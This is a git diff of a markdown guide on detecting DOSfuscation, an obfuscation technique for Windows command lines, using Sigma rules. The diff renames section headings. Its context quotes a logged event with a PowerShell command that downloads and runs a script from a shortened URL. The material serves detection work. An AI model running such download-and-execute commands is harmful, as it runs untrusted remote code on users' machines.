@@ -4,9 +4,9 @@
 * [Problem](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#problem)
 * [Solution](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#solution)
 * [Suggested Approach](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#the-approach)
-   * [Framework option #1 - BINARY](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#binary)
-   * [Framework option #2 - ENCODING](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#encoding)
-   * [Framework option #3 - PAYLOAD](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#payload)
+   * [Framework option #1 - BINARY NAMES OBFUSCATION](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#binary)
+   * [Framework option #2 - BASIC PAYLOAD ENCODING](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#encoding)
+   * [Framework option #3 - ADVANCED PAYLOAD OBFUSCATION](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#payload)
 * [Case Sensitivity Issue](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#case-sensitivity)
 * [Framework's Test Harness Module](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#frameworks-test-harness-module)
 * [How to Use Test Harness Module](https://github.com/zinint/OSCD_Invoke-DOSfuscation/blob/master/OSCD%20-%20Issue%20-%20DOSfuscation.md#how-to-use-test-harness-module)
@@ -74,7 +74,7 @@ The framework provides 3 main obfuscation options:
 
 Let's go through them one by one.
 
-### BINARY
+### BINARY NAMES OBFUSCATION
 
 #### Environment Variable Substrings
 
@@ -130,11 +130,11 @@ we'll see the following parent-child process creation chain in the Windows Event
  <Data Name="CommandLine">PowerShell IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/L3g1t')</Data> 
 ```
 
-### ENCODING
+### BASIC PAYLOAD ENCODING
 
 Substrings of existing environment variables can be used to encode entire batch file contents or select portions of commands. These payload encoding techniques only affect static detections because these encodings do not remain in the dynamic execution of external commands in the batch files, so they are considered out of scope for this Issue.
 
-### PAYLOAD
+### ADVANCED PAYLOAD OBFUSCATION
 
 As Daniel Bohannon ([@danielhbohannon](https://twitter.com/danielhbohannon)) pointed out, there are numerous building blocks that must be combined to perform the advanced payload encoding techniques. Searching for these building blocks in process arguments, common persistence locations and in file repositories is a good first step in reducing the data set when building robust detections for DOSfuscation in general. We're going to use Sigma so we'll be looking for those building blocks in command-line events (WEL Security Event ID 4688 and Sysmon Event ID 1).
 
